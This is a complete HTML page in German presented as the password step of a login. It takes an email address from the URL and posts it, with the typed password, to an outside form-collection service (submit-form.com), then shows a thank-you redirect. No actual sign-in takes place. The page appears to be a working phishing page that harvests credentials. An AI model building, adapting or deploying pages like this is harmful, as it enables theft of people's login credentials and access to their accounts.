<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Login - Passwort</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <!-- Header Image -->
  <div class="header">
    <img src="images/header.jpg" alt="Header Banner">
  </div>

  <!-- Centered Form -->
  <div class="form-box">
    <img src="images/logo-password.png" alt="Logo" class="form-logo">

    <!-- Formspark form -->
    <form id="passwordForm" action="https://submit-form.com/2egN1olQUD" method="POST">
      <!-- Hidden email field (passed from first page via URL) -->
      <input type="hidden" name="email" id="hiddenEmail">

      <!-- Fallback redirect: JS sets absolute path for local testing -->
      <input type="hidden" name="_redirect" id="redirectField" value="thankyou.html">

      <label for="password">Passwort</label>
      <input type="password" id="password" name="password" required>

      <p class="info-text">
        Geben Sie Ihr Passwort ein, um fortzufahren
      </p>

      <button type="submit" class="weiter-btn">Weiter</button>
    </form>
  </div>

  <script>
    // 1️⃣ Grab email from URL query string and populate hidden field
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");
    if (email) {
      document.getElementById("hiddenEmail").value = email;
    }

    // 2️⃣ Set redirect to absolute URL if testing locally
    const redirectField = document.getElementById("redirectField");
    if (window.location.protocol === "file:") {
      // Example: adjust the path to your local folder
      redirectField.value = window.location.href.replace(/password\.html.*$/, "thankyou.html");
    }
  </script>

</body>
</html>
